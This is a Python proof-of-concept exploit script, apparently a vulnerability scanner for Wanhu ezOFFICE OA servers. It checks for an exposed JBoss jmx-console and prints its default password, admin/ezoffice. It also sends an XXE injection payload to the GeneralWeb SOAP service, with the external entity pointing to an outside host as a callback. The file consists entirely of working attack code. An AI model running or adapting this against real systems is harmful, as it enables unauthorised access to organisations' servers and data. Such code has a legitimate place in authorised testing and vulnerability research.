import time
import requests
import urllib3
from rich.console import Console    
import argparse
import multiprocessing
console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "SOAPAction": "", 
        "Content-Type": "text/xml; charset=UTF-8",
        "Accept-Encoding": "gzip,deflate",
        }
    
    data='''<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://pysandbox.sinaapp.com/kv?act=get&k=ezoffice">
%xxe;]>'''
    
    
    console.print(now_time() + " [INFO]     正在检测万户OA jmx-console", style='bold blue')
    jmx_path=target_url+"jmx-console"
    exp_url = target_url+"defaultroot/xfservices/GeneralWeb"
    try:
        find = requests.get(jmx_path, headers=headers,verify=False)
        xxe = requests.post(exp_url, headers=headers,data=data,verify=False)
        if "jboss" in find.text:
            console.print(now_time() + ' [SUCCESS]  发现jboss （默认密码admin/ezoffice）:{}'.format(jmx_path), style='bold green')
        elif 'JBoos' in  xxe.text or "soap" in xxe.text :
            console.print(now_time() + ' [SUCCESS]  发现jboss POST XXE注入:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  万户OA jmx-console 漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
        

            
        

            
            
